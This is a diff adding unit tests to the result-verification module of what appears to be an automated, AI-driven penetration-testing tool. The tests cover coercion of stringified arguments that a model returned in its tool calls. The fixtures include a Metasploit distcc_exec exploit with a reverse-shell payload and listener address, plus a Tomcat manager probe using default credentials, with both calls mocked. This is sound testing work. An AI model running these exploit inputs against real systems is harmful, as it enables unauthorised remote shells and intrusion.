@@ -125,6 +125,95 @@ def test_replay_unknown_tool_returns_error():
     assert "error" in result
 
 
+# --- _coerce_dict / _coerce_int: non-Anthropic tool-call type mismatches ---
+#
+# Surfaced by a real live run against Qwen3.6 Plus (via OpenRouter): unlike
+# Claude's native tool use, it didn't always emit correctly-typed nested
+# arguments matching the declared JSON schema -- dict-typed fields came back
+# as JSON-encoded strings, int-typed fields as numeric strings. The original
+# exploit_agent calls apparently succeeded anyway (the MCP server layer
+# likely coerces types before the registered tool function runs); replay
+# bypasses that layer and crashed with real Python TypeErrors
+# ("'<=' not supported between instances of 'int' and 'str'",
+# "'str' object has no attribute 'items'"), which verify_agent correctly
+# treated as unverifiable rather than misreading as disproof -- but the
+# crash itself is a real bug, fixed here.
+
+
+def test_coerce_dict_parses_json_string():
+    assert verify._coerce_dict('{"Authorization": "Basic xyz"}') == {"Authorization": "Basic xyz"}
+
+
+def test_coerce_dict_passes_through_real_dict_unchanged():
+    assert verify._coerce_dict({"a": 1}) == {"a": 1}
+
+
+def test_coerce_dict_passes_through_none_unchanged():
+    assert verify._coerce_dict(None) is None
+
+
+def test_coerce_dict_non_json_string_passed_through_unchanged():
+    # Not silently discarded -- a genuinely malformed value surfaces its own
+    # error downstream rather than being swallowed here.
+    assert verify._coerce_dict("not json") == "not json"
+
+
+def test_coerce_int_parses_numeric_string():
+    assert verify._coerce_int("44440") == 44440
+
+
+def test_coerce_int_passes_through_real_int_unchanged():
+    assert verify._coerce_int(3632) == 3632
+
+
+def test_coerce_int_passes_through_none_unchanged():
+    assert verify._coerce_int(None) is None
+
+
+def test_replay_metasploit_with_stringified_port_and_lport_does_not_crash():
+    """The exact f3 (distccd) shape from the live Qwen run: lport/port
+    recorded as strings. Previously crashed with
+    "'<=' not supported between instances of 'int' and 'str'".
+    """
+    tool_input = {
+        "module": "exploit/unix/misc/distcc_exec",
+        "target": "10.0.0.5",
+        "payload": "cmd/unix/reverse",
+        "lhost": "192.168.56.1",
+        "lport": "44440",
+        "port": "3632",
+        "post_exploit_command": "whoami",
+    }
+    with patch("categories.verify.run_metasploit", return_value={"ok": True}) as mock_run:
+        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "metasploit", tool_input)
+    assert result == {"ok": True}
+    call_kwargs = mock_run.call_args[0]
+    # port, lport positionally: (scope, executor, timeout, module, target, port, payload, lhost, lport, options, post_exploit_command)
+    assert call_kwargs[5] == 3632
+    assert call_kwargs[8] == 44440
+    assert isinstance(call_kwargs[5], int) and isinstance(call_kwargs[8], int)
+
+
+def test_replay_probe_variant_with_stringified_headers_does_not_crash():
+    """The exact f6 (Tomcat manager) shape from the live Qwen run: headers
+    recorded as JSON-encoded strings. Previously crashed with
+    "'str' object has no attribute 'items'".
+    """
+    tool_input = {
+        "method": "GET",
+        "url": "http://10.0.0.5:8180/manager/html",
+        "baseline_headers": "{}",
+        "variant_headers": '{"Authorization": "Basic dG9tY2F0OnRvbWNhdA=="}',
+    }
+    with patch("categories.verify.run_probe_variant", return_value={"ok": True}) as mock_run:
+        result = verify._replay_call(_scope(), _executor(), TIMEOUTS, "probe_variant", tool_input)
+    assert result == {"ok": True}
+    call_args = mock_run.call_args[0]
+    # (scope, executor, timeout, method, url, baseline_headers, variant_headers, baseline_params, variant_params, body)
+    assert call_args[5] == {}
+    assert call_args[6] == {"Authorization": "Basic dG9tY2F0OnRvbWNhdA=="}
+
+
 # --- end-to-end: recorded_calls filter picks up the previously-dropped tools ---
 
 
